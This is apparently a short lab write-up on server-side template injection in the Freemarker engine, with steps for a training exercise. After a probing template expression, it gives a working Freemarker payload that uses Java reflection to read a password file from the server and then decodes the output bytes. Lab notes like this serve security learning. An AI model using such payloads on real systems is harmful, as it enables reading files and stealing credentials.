

> This lab uses the Freemarker template engine
- Good write up -> https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack

1. Log in into the application
2. Edit any template;
3. Insert the following payload;

```
${object.getClass()}
```

![](/static/img/Pasted_image_20231121131920.png)

4. Using the following payload, you can get the `password` from the user

![](/static/img/Pasted_image_20231121172733.png)

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}

```

5. Look at the end, numbers in hex, convert to ascii

![](/static/img/Pasted_image_20231121172953.png)

![](/static/img/Pasted_image_20231121173031.png)

